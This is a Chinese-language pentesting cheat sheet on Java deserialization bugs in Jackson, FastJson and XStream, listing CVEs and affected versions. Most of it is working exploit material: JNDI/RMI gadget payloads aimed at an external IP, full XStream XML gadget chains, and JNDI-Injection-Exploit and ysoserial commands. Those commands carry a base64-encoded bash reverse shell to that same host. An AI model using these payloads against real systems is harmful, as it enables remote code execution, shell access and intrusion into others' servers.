
---
黑盒检测：Java应用 请求参数数据以json/xml格式发送测试

黑盒判断：通过提交数据报错信息得到什么组件
xml格式(xstream) 或 json 格式（fastjson jackson）

白盒：直接看引用组件版本

# Jackson

当下流行的json解释器，主要负责处理Json的序列化和反序列化。
历史漏洞：https://avd.aliyun.com/search?q=Jackson

1、代码执行 (CVE-2020-8840)

2.0.0 <= FasterXML jackson-databind Version <= 2.9.10.2

```java
String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/Exploit\"}]";
```

2、代码执行 （CVE-2020-35728）

FasterXML jackson-databind 2.x < 2.9.10.8

```java
String payload = "[\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"rmi://47.94.236.117:1099/gtaafz\"}]";
```

# FastJson

阿里巴巴公司开源的json解析器，它可以解析JSON格式的字符串，支持将JavaBean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。

历史漏洞：https://avd.aliyun.com/search?q=fastjson

利用POC：https://github.com/kezibei/fastjson_payload

FastJson <= 1.2.24

```java
String payload = "{\r\n"

+ " \"a\": {\r\n"

+ " \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \r\n"

+ " \"dataSourceName\": \"rmi://127.0.0.1:1099/Object\", \r\n"

+ " \"autoCommit\": true\r\n"

+ " }\r\n"

+ "}";
```

FastJson <= 1.2.47

```java
JSONObject jsonToObject = JSON.parseObject("{\n" +

" \"a\":{\n" +

" \"@type\":\"java.lang.Class\",\n" +

" \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +

" },\n" +

" \"b\":{\n" +

" \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +

" \"dataSourceName\":\"rmi://47.94.236.117:1099/j2azgf\",\n" +

" \"autoCommit\":true\n" +

" }\n" +

"}");
```

FastJson <= 1.2.80
开始没有autotype类，所以需要引用自带的组件和类文件

利用poc只能用项目中调用的组件和类文件

# XStream

开源Java类库，能将对象序列化成XML或XML反序列化为对象

历史漏洞：https://avd.aliyun.com/search?q=XStream

1、代码执行 (CVE-2021-21351)

Xstream<=1.4.15

-生成反弹Shell的JNDI注入

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3Lzk5MDAgMD4mMQ==}|{base64,-d}|{bash,-i}" -A 47.94.236.117
```

-构造JNDI注入Payload提交

```xml
<sorted-set>

<javax.naming.ldap.Rdn_-RdnEntry>

<type>ysomap</type>

<value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>

<m__DTMXRTreeFrag>

<m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>

<m__size>-10086</m__size>

<m__mgrDefault>

<__overrideDefaultParser>false</__overrideDefaultParser>

<m__incremental>false</m__incremental>

<m__source__location>false</m__source__location>

<m__dtms>

<null/>

</m__dtms>

<m__defaultHandler/>

</m__mgrDefault>

<m__shouldStripWS>false</m__shouldStripWS>

<m__indexing>false</m__indexing>

<m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>

<fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>

<javax.sql.rowset.BaseRowSet>

<default>

<concurrency>1008</concurrency>

<escapeProcessing>true</escapeProcessing>

<fetchDir>1000</fetchDir>

<fetchSize>0</fetchSize>

<isolation>2</isolation>

<maxFieldSize>0</maxFieldSize>

<maxRows>0</maxRows>

<queryTimeout>0</queryTimeout>

<readOnly>true</readOnly>

<rowSetType>1004</rowSetType>

<showDeleted>false</showDeleted>

<dataSource>rmi://evil-ip:1099/example</dataSource>

<listeners/>

<params/>

</default>

</javax.sql.rowset.BaseRowSet>

<com.sun.rowset.JdbcRowSetImpl>

<default/>

</com.sun.rowset.JdbcRowSetImpl>

</fPullParserConfig>

<fConfigSetInput>

<class>com.sun.rowset.JdbcRowSetImpl</class>

<name>setAutoCommit</name>

<parameter-types>

<class>boolean</class>

</parameter-types>

</fConfigSetInput>

<fConfigParse reference='../fConfigSetInput'/>

<fParseInProgress>false</fParseInProgress>

</m__incrementalSAXSource>

<m__walker>

<nextIsRaw>false</nextIsRaw>

</m__walker>

<m__endDocumentOccured>false</m__endDocumentOccured>

<m__idAttributes/>

<m__textPendingStart>-1</m__textPendingStart>

<m__useSourceLocationProperty>false</m__useSourceLocationProperty>

<m__pastFirstElement>false</m__pastFirstElement>

</m__dtm>

<m__dtmIdentity>1</m__dtmIdentity>

</m__DTMXRTreeFrag>

<m__dtmRoot>1</m__dtmRoot>

<m__allowRelease>false</m__allowRelease>

</value>

</javax.naming.ldap.Rdn_-RdnEntry>

<javax.naming.ldap.Rdn_-RdnEntry>

<type>ysomap</type>

<value class='com.sun.org.apache.xpath.internal.objects.XString'>

<m__obj class='string'>test</m__obj>

</value>

</javax.naming.ldap.Rdn_-RdnEntry>

</sorted-set>
```

2、远程代码执行 （CVE-2021-29505）

XStream <= 1.4.16

-生成反弹Shell的反序列化JNDI注入

```
java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1089 CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3Lzk5MDAgMD4mMQ==}|{base64,-d}|{bash,-i}"
```

-构造反序列化JNDI注入Payload提交

执行一次需要换端口
```xml
<java.util.PriorityQueue serialization='custom'>

<unserializable-parents/>

<java.util.PriorityQueue>

<default>

<size>2</size>

</default>

<int>3</int>

<javax.naming.ldap.Rdn_-RdnEntry>

<type>12345</type>

<value class='com.sun.org.apache.xpath.internal.objects.XString'>

<m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>

</value>

</javax.naming.ldap.Rdn_-RdnEntry>

<javax.naming.ldap.Rdn_-RdnEntry>

<type>12345</type>

<value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>

<message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>

<parsedMessage>true</parsedMessage>

<soapVersion>SOAP_11</soapVersion>

<bodyParts/>

<sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>

<attachmentsInitialized>false</attachmentsInitialized>

<nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>

<aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>

<candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>

<names>

<string>aa</string>

<string>aa</string>

</names>

<ctx>

<environment/>

<registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>

<java.rmi.server.RemoteObject>

<string>UnicastRef</string>

<string>47.94.236.117</string>

<int>1089</int>

<long>0</long>

<int>0</int>

<long>0</long>

<short>0</short>

<boolean>false</boolean>

</java.rmi.server.RemoteObject>

</registry>

<host>47.94.236.117</host>

<port>1089</port>

</ctx>

</candidates>

</aliases>

</nullIter>

</sm>

</message>

</value>

</javax.naming.ldap.Rdn_-RdnEntry>

</java.util.PriorityQueue>

</java.util.PriorityQueue>
```